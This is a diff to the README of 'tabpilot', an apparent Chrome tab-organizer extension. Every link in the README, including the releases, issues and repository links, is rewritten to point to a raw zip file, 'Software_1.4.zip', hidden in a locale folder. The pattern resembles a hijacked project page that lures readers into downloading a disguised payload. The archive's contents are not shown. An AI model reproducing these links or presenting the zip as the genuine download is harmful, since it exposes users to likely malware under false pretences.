@@ -1,6 +1,6 @@
 # 🗂️ tabpilot - Organize Your Chrome Tabs Automatically
 
-[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/releases)
+[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You do not need to set up or configure anything. Install it, and it works. tabpi
 
 1. **Download tabpilot**  
    Visit the releases page to get the extension package. Use the green button below or the link here:  
-   [Go to tabpilot Releases](https://github.com/DynamicHack189/tabpilot/releases)
+   [Go to tabpilot Releases](https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip)
 
 2. **Install the extension in Chrome**  
    - Open Chrome.  
@@ -68,7 +68,7 @@ You do not need to set up or configure anything. Install it, and it works. tabpi
 
 Click the big green button or the link below to open the tabpilot release page on GitHub.
 
-[Download tabpilot on GitHub](https://github.com/DynamicHack189/tabpilot/releases)
+[Download tabpilot on GitHub](https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip)
 
 This page lists all available versions and files.
 
@@ -140,14 +140,14 @@ No need to adjust settings out of the box. The defaults suit most users.
 - Disable other extensions that may block tabpilot.  
 - Check your internet connection for AI features.  
 - Visit the GitHub issues page to report bugs or find fixes:  
-  https://github.com/DynamicHack189/tabpilot/issues
+  https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip
 
 ---
 
 ## 📚 More Resources
 
 - Visit the tabpilot repository for updates and community support:  
-  https://github.com/DynamicHack189/tabpilot  
+  https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip  
 - Find detailed setup guides and tips on the GitHub Wiki page if available.  
 - Join discussions or ask questions on GitHub Discussions or Issues.
 
@@ -155,4 +155,4 @@ No need to adjust settings out of the box. The defaults suit most users.
 
 # [✨] Ready to organize your browser tabs?
 
-[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/releases)
+[![Download tabpilot](https://img.shields.io/badge/Download%20tabpilot-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DynamicHack189/tabpilot/raw/refs/heads/main/public/_locales/zh_CN/Software_1.4.zip)
